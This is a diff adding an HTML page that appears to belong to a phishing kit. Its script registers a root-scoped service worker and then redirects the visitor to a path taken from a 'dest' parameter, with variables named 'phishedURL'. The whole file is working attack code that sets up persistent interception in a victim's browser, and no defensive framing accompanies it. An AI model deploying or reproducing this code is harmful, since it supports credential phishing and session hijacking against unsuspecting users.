@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <script>
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/sw_257d3c475e1e56ec.js", { scope: "/" })
+                .then((registration) => {
+                    const phishedParameterURL = new URL(self.location.href).searchParams.get("dest");
+                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
+                })
+                .catch((error) => {
+                    console.error(`Service worker registration failed: ${error}`);
+                });
+        } else {
+            console.error("Service workers are not supported by this browser");
+        }
+    </script>
+</body>
+</html>
